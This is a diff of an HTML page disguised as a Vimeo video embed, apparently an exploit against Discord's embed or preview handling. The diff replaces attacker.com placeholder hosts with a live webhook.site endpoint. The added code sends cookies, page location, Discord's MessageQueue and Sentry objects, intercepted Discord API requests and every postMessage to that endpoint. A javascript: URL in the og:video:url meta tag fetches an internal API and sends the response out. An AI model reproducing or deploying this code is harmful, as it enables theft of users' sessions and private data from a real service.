@@ -4,7 +4,7 @@
     <meta property="og:site_name" content="Vimeo">
     <meta property="og:type" content="video.other">
     <meta property="og:image" content="https://i.vimeocdn.com/video/test/maxresdefault.jpg">
-    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=javascript:void(fetch('/api/v9/science').then(r=>r.text()).then(t=>fetch('https://attacker.com/'+btoa(t))))">
+    <meta property="og:video:url" content="https://player.vimeo.com/video/123456789/login/private?success=javascript:void(fetch('/api/v9/science').then(r=>r.text()).then(t=>fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124?type=science&data='+encodeURIComponent(t))))">
     <meta property="og:video:secure_url" content="https://player.vimeo.com/video/123456789?player_id=vimeo-player&amp;api=1&amp;callback=initVimeoPlayer">
     <meta property="og:video:type" content="text/html">
     <meta property="og:video:width" content="1280">
@@ -20,7 +20,7 @@
                     width: 1920,
                     height: 1080,
                     bitrate: 120000,
-                    framerate: 30.0  
+                    framerate: 30.0
                 }
             };
             
@@ -29,21 +29,39 @@
             
             // Try to access Discord's MessageQueue
             if (window.MessageQueue) {
-                console.log('MessageQueue found:', window.MessageQueue);
+                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        type: 'messagequeue',
+                        data: window.MessageQueue
+                    })
+                });
             }
             
             // Attempt to intercept Discord API calls
             const originalFetch = window.fetch;
             window.fetch = function(url, options) {
                 if (url.includes('discord.com/api')) {
-                    // Attempt to exfiltrate API data
-                    const exfilData = btoa(JSON.stringify({url, options}));
-                    new Image().src = 'https://attacker.com/log?' + exfilData;
+                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            type: 'api_intercept',
+                            url: url,
+                            options: options
+                        })
+                    });
                 }
                 return originalFetch.apply(this, arguments);
             };
         } catch(e) {
             console.error('Media exploit failed:', e);
+            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                method: 'POST',
+                body: JSON.stringify({
+                    type: 'error',
+                    error: e.toString()
+                })
+            });
         }
     }
 
@@ -53,17 +71,27 @@
             const iframe = document.createElement('iframe');
             iframe.srcdoc = `
                 <script>
-                    window.parent.postMessage({
-                        type: 'DISCORD_MESSAGE',
-                        payload: document.cookie
-                    }, '*');
+                    fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                        method: 'POST',
+                        body: JSON.stringify({
+                            type: 'iframe_loaded',
+                            cookies: document.cookie,
+                            location: window.location.href
+                        })
+                    });
                 <\/script>
             `;
             document.body.appendChild(iframe);
             
             // Try to access Discord's Sentry instance
             if (window.__SENTRY__) {
-                console.log('Sentry found:', window.__SENTRY__);
+                fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                    method: 'POST',
+                    body: JSON.stringify({
+                        type: 'sentry_found',
+                        data: window.__SENTRY__
+                    })
+                });
             }
         } catch(e) {
             console.error('Player init error:', e);
@@ -74,8 +102,14 @@
     
     // Listen for postMessage responses
     window.addEventListener('message', function(event) {
-        if (event.data && event.data.type === 'DISCORD_MESSAGE') {
-            new Image().src = 'https://attacker.com/discord?' + btoa(event.data.payload);
+        if (event.data) {
+            fetch('https://webhook.site/bbeb07ea-30e9-4522-802f-7e6ad1ccb124', {
+                method: 'POST',
+                body: JSON.stringify({
+                    type: 'postMessage',
+                    data: event.data
+                })
+            });
         }
     });
     </script>
